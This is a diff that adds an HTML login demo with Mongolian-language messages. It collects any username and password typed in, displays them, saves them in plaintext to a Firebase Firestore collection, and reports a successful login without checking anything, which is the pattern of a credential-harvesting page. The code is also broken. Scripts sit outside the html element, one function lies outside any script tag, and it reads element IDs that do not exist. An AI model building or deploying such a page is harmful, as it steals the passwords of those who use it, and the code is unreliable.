@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Live Login Demo</title>
+</head>
+<body>
+
+<h2>Login</h2>
+
+<input type="text" id="username" placeholder="Username"><br><br>
+<input type="password" id="password" placeholder="Password"><br><br>
+
+<button onclick="login()">Login</button>
+
+<h3>Logged Users:</h3>
+<ul id="log"></ul>
+
+<script>
+function login() {
+  let user = document.getElementById("username").value;
+  let pass = document.getElementById("password").value;
+
+  let log = document.getElementById("log");
+  let item = document.createElement("li");
+
+  item.textContent = "User: " + user + " | Pass: " + pass;
+  log.appendChild(item);
+}
+</script>
+
+</body>
+</html>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "ЧИНИЙ apiKey",
+  authDomain: "ЧИНИЙ domain",
+  projectId: "ЧИНИЙ projectId",
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+</script>
+
+function login(){
+  let u = document.getElementById("user").value;
+  let p = document.getElementById("pass").value;
+
+  if(!u || !p){
+    alert("Мэдээллээ бүрэн оруул!");
+    return;
+  }
+
+  db.collection("users").add({
+    username: u,
+    password: p,
+    time: Date.now()
+  });
+
+  alert("Амжилттай нэвтэрлээ");
+}
+
+function showUsers(){
+  db.collection("users")
+    .orderBy("time", "desc")
+    .onSnapshot(snapshot => {
+      let list = document.getElementById("log");
+      list.innerHTML = "";
+
+      snapshot.forEach(doc => {
+        let user = doc.data();
+        let li = document.createElement("li");
+        li.innerText = user.username + " | " + user.password;
+        list.appendChild(li);
+      });
+    });
+}
